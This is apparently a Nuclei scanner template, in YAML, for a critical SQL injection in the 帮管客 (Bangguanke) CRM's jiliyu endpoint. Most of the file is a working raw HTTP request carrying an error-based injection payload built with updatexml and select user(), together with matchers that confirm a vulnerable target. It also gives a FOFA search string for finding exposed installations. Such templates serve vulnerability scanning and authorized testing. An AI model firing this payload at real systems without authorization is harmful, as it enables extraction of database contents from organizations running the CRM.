id: Bangguanke-CRM-jiliyu-sqli

info:
  name: 帮管客 CRM jiliyu SQL注入漏洞
  author: linfeng7z
  severity: critical
  description: 帮管客 CRM jiliyu 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
  metadata:
    fofa-qeury: app="帮管客-CRM"
    veified: true
  tags: bgk,bangguanke,crm,sql,sqli

http:
  - raw:
      - |
        GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20user()),0x7f),1)) HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    matchers:
      - type: dsl
        dsl:
          - "contains(body, '@localhost') && contains(body,'XPATH syntax error')"
        condition: and